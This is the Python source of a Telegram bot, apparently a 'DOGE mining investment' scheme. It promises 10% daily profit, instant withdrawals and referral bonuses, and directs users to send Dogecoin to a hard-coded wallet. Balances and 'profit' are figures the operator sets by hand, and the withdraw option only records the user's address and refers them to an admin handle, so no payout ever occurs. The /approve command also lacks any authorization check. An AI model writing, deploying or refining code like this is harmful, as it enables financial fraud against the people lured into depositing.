import os, json, threading
from datetime import datetime
from flask import Flask
import telebot
from telebot import types
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
DAILY = 10
MIN_DOGE = 100
MIN_USD = 10
REF_BONUS = 10
YOUR_WALLET = "D9CyxEDc8aEvrhu4HDCTfwz33vL6YtpcYX"
ADMIN = "@cityhyena"
DB_FILE = "users.json"
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE,'r') as f: return json.load(f)
        except: return {}
    return {}
def save_db(d):
    with open(DB_FILE,'w') as f: json.dump(d,f)
def get_user(uid):
    db=load_db()
    s=str(uid)
    if s not in db:
        db[s]={"invested":0,"profit":0,"last":str(datetime.now()),"refs":0,"wallet":""}
        save_db(db)
    return db[s], db
@bot.message_handler(commands=['start'])
def start(m):
    uid=m.from_user.id
    parts=m.text.split()
    db=load_db()
    if len(parts)>1:
        ref=parts[1]
        if ref!=str(uid) and ref in db:
            db[ref]["refs"]+=1
            bonus = MIN_DOGE * REF_BONUS / 100
            db[ref]["profit"]+=bonus
            save_db(db)
            try: bot.send_message(int(ref), f"🎉 +{bonus} DOGE Referral Bonus!")
            except: pass
    get_user(uid)
    kb=types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("💰 Deposit $10", callback_data="dep"), types.InlineKeyboardButton("📊 Balance", callback_data="bal"))
    kb.add(types.InlineKeyboardButton("💸 Withdraw", callback_data="wit"), types.InlineKeyboardButton("👥 Referral 10%", callback_data="ref"))
    bot.send_message(m.chat.id, f"🚀 *DOGE MINING INVESTMENT* 🚀\n━━━━━━━━━━━━━━━\n💹 *Profit:* {DAILY}% Daily\n💵 *Min:* ${MIN_USD} ({MIN_DOGE} DOGE)\n👥 *Referral:* {REF_BONUS}%\n⚡️ *Withdrawal:* Instant\n\n📈 Example: Invest 100 DOGE → Earn 10 DOGE Daily\n", parse_mode="Markdown", reply_markup=kb)
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid=c.from_user.id
    user, db = get_user(uid)
    if c.data=="dep":
        bot.send_message(c.message.chat.id, f"💰 *DEPOSIT TO START MINING*\n\nSend *{MIN_DOGE} DOGE* or more to:\n\n`{YOUR_WALLET}`\n\n*Minimum: ${MIN_USD} ({MIN_DOGE} DOGE)*\n*Network: DOGE*\n\nAfter send, contact {ADMIN}\n", parse_mode="Markdown")
    elif c.data=="bal":
        try:
            last=datetime.fromisoformat(user["last"])
            hours=(datetime.now()-last).total_seconds()/3600
            earn = user["invested"]*DAILY/100/24*hours
            total_profit = user["profit"]+earn
        except:
            total_profit=user["profit"]
            earn=0
        bot.send_message(c.message.chat.id, f"📊 *YOUR MINING DASHBOARD*\n\n💼 Active: {user['invested']} DOGE\n💹 Profit: {total_profit:.6f} DOGE\n💰 Daily: {user['invested']*DAILY/100:.2f} DOGE\n👥 Refs: {user['refs']}\n", parse_mode="Markdown")
    elif c.data=="wit":
        bot.send_message(c.message.chat.id, "💸 *Withdraw*\n\nSend your DOGE wallet address:", parse_mode="Markdown")
        bot.register_next_step_handler(c.message, save_wallet)
    elif c.data=="ref":
        link=f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.send_message(c.message.chat.id, f"👥 *REFER & EARN 10%*\n\nYour Link:\n`{link}`\n", parse_mode="Markdown")
def save_wallet(m):
    db=load_db()
    db[str(m.from_user.id)]["wallet"]=m.text
    save_db(db)
    bot.send_message(m.chat.id, f"✅ Wallet saved! `{m.text}`\nContact {ADMIN}", parse_mode="Markdown")
@bot.message_handler(commands=['balance','approve'])
def cmds(m):
    if m.text.startswith("/approve"):
        try:
            _, uid, amount = m.text.split()
            db=load_db()
            if uid in db:
                db[uid]["invested"]+=float(amount)
                db[uid]["last"]=str(datetime.now())
                save_db(db)
                bot.send_message(m.chat.id, f"✅ Approved {amount} DOGE for {uid}")
                bot.send_message(int(uid), f"✅ Deposit Approved! {amount} DOGE mining started! 10% daily! 🚀")
        except:
            bot.send_message(m.chat.id, "Use: /approve USERID AMOUNT")
    else:
        user,_=get_user(m.from_user.id)
        bot.send_message(m.chat.id, f"💼 Invested: {user['invested']} DOGE | Profit: {user['profit']:.2f} DOGE")
app=Flask(__name__)
@app.route('/')
def home(): return "Doge 10% Daily Bot Live!"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()
print("Bot Running!")
bot.infinity_polling()
